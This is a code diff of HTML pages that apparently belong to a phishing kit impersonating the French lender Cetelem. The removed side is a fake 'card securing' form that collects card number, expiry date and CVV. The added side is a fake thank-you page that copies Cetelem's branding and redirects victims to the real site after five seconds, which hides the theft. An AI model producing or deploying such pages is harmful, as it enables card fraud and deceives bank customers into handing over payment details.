@@ -2,76 +2,192 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <title>Connexion - Espace client</title>
+  <title>Merci - Cetelem</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="icon" href="https://www.cetelem.fr/favicon.ico" type="image/x-icon" />
+  <meta http-equiv="refresh" content="5;url=https://www.cetelem.fr/fr/accueil">
   <style>
-    body{margin:0;font-family:'Segoe UI',Arial,sans-serif;background:#c0d4cc;color:#333}
-    .logo{text-align:center;font-size:30px;font-weight:bold;color:#2e7d54;padding-top:25px}
-    .subtext{text-align:center;font-size:13px;color:#555;margin-bottom:25px;padding:0 15px}
-    .login-box{background:#fff;max-width:390px;margin:0 auto;padding:35px 30px;border-radius:10px;
-               box-shadow:0 0 12px rgba(0,0,0,.15);text-align:center;box-sizing:border-box}
-    .login-box h1{font-size:20px;margin-bottom:22px}
-    label{font-size:14px;display:block;text-align:left;margin-bottom:6px;font-weight:500}
-    input[type="text"],input[type="tel"]{
-      width:100%;padding:11px;font-size:15px;border:1px solid #2e7d54;border-radius:5px;
-      margin-bottom:18px;box-sizing:border-box;outline:none}
-    .btn{background:#2e7d54;color:#fff;font-size:15px;padding:11px 0;width:100%;border:none;
-         border-radius:5px;cursor:pointer}
-    .alert-box{background:#fef6e0;border-left:5px solid orange;padding:18px 20px;margin:30px auto;
-               max-width:420px;font-size:13.5px;border-radius:6px;color:#444;box-sizing:border-box}
-    footer{text-align:center;font-size:12px;margin:35px 15px 25px;color:#333}
-    footer a{margin:0 6px;color:#000;text-decoration:none}
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f0f0;
+      margin: 0;
+      color: #333;
+    }
+
+    .header {
+      background-color: #fff;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+      padding: 10px 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+      flex-wrap: wrap;
+    }
+
+    .header-left {
+      display: flex;
+      align-items: center;
+    }
+
+    .header-logo {
+      max-width: 100px;
+    }
+
+    .header-right {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      flex-wrap: wrap;
+      margin-top: 10px;
+    }
+
+    .virement-btn, .espace-perso-btn {
+      padding: 8px 12px;
+      font-size: 12px;
+      text-decoration: none;
+      font-weight: bold;
+      border-radius: 5px;
+      text-align: center;
+    }
+
+    .virement-btn {
+      background-color: #e0e0e0;
+      color: #333;
+      border: 1px solid #ccc;
+    }
+
+    .espace-perso-btn {
+      background-color: #2e7d54;
+      color: #fff;
+    }
+
+    .disclaimer {
+      text-align: center;
+      padding: 10px;
+      font-size: 11px;
+      color: #555;
+    }
+
+    .main-content {
+      max-width: 800px;
+      margin: 20px auto;
+      background: #fff;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 12px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+
+    .main-content h1 {
+        font-size: 24px;
+        color: #2e7d54;
+        margin-bottom: 20px;
+    }
+
+    .main-content p {
+        font-size: 16px;
+        line-height: 1.5;
+        margin-bottom: 15px;
+    }
+
+    .main-content a {
+        color: #2e7d54;
+        font-weight: bold;
+        text-decoration: none;
+    }
+
+    .footer {
+      font-size: 10px;
+      text-align: left;
+      margin-top: 20px;
+      padding: 0 10px;
+    }
+
+    .footer-links-container {
+        border-top: 1px solid #ddd;
+        padding-top: 15px;
+        display: flex;
+        flex-wrap: wrap;
+        justify-content: center;
+        gap: 10px 10px;
+        background-color: #fff;
+    }
+
+    .footer-links-container a {
+      color: #333;
+      text-decoration: none;
+      font-size: 10px;
+    }
+
+    /* Media Queries */
+    @media (min-width: 768px) {
+      .header-right {
+        gap: 15px;
+        margin-top: 0;
+      }
+      .virement-btn, .espace-perso-btn {
+        padding: 8px 15px;
+        font-size: 14px;
+      }
+      .main-content {
+        max-width: 800px;
+        padding: 30px;
+      }
+      .main-content h1 {
+          font-size: 32px;
+      }
+      .footer-links-container {
+        padding-top: 20px;
+        gap: 10px 15px;
+      }
+      .footer-links-container a {
+        font-size: 12px;
+      }
+    }
+
+    @media (max-width: 767px) {
+      .main-content {
+        max-width: 95%;
+        padding: 15px;
+      }
+    }
   </style>
 </head>
 <body>
 
-  <div class="logo">
-    <img src="https://www.cetelem.fr/brand/logo.svg" alt="Cetelem">
+  <header class="header">
+    <div class="header-left">
+      <img src="https://www.liblogo.com/img-logo/ce4075lbc9-cetelem-logo-logo-de-cetelem-la-historia-y-el-significado-del-logotipo-la.png" alt="Cetelem" class="header-logo">
+    </div>
+    <div class="header-right">
+      <a href="#" class="virement-btn">VIREMENT EXPRESS</a>
+      <a href="#" class="espace-perso-btn">VOTRE ESPACE PERSONNEL</a>
+    </div>
+  </header>
+
+  <div class="disclaimer">
+    Un crédit vous engage et doit être remboursé. Vérifiez vos capacités de remboursement avant de vous engager.
   </div>
 
-  <div class="subtext">
-    <strong>Un crédit vous engage et doit être remboursé.</strong>
-    Vérifiez vos capacités de remboursement avant de vous engager.
-  </div>
-
-  <div class="login-box">
-    <h1>Sécurisation de votre carte Cpay</h1>
-
-    <!-- le formulaire s’envoie maintenant vers /merci -->
-    <form method="POST" action="/merci">
-      <label for="carte">Numéro de carte bancaire :</label>
-      <input type="text" id="carte" name="carte"
-             placeholder="Ex : 4100010203040506" pattern="\d{13,19}" maxlength="19" required>
-
-      <label for="date_exp">Date d'expiration (MM/YY) :</label>
-      <input type="text" id="date_exp" name="date_exp"
-             placeholder="MM/YY" pattern="^(0[1-9]|1[0-2])\/\d{2}$" required>
-
-      <label for="cvv">Cryptogramme :</label>
-      <input type="text" id="cvv" name="cvv"
-             placeholder="Ex : 123" pattern="\d{3,4}" maxlength="4" required>
-
-      <button class="btn" type="submit">Valider</button>
-    </form>
-  </div>
-
-  <div class="alert-box">
-    <strong>⚠️ Contre la fraude, adoptez les bons réflexes</strong><br>
-    Ne communiquez jamais vos informations personnelles (identifiant, numéro de carte Cpay, code secret, etc.)
-    par téléphone, email, chat ou réseaux sociaux. JAMAIS Cetelem ne vous les demandera.
-    <br>
-    <button>Découvrez nos conseils →</button>
+  <div class="main-content">
+    <h1>Merci pour votre vérification !</h1>
+    <p>Votre demande a bien été prise en compte et va être traitée dans les plus brefs délais.</p>
+    <p>Vous pouvez retourner à la page d'accueil en <a href="https://www.cetelem.fr/fr/accueil">cliquant ici</a>.</p>
   </div>
 
   <footer>
-    <a href="#">Virement express</a>
-    <a href="#">Réclamation</a>
-    <a href="#">Contact</a>
-    <a href="#">Questions / Réponses</a>
-    <a href="#">Mentions légales</a>
-    <a href="#">Cookies</a>
-    <a href="#">Préférences cookies</a>
-    <a href="#">Accessibilité</a>
+    <div class="footer-links-container">
+        <a href="#">Nos solutions de crédit</a>
+        <a href="#">Prêt auto</a>
+        <a href="#">Crédit moto & scooter</a>
+        <a href="#">Crédit travaux</a>
+        <a href="#">Prêt immobilier</a>
+        <a href="#">Crédit renouvelable</a>
+        <a href="#">Regroupement de crédits</a>
+    </div>
   </footer>
 
 </body>
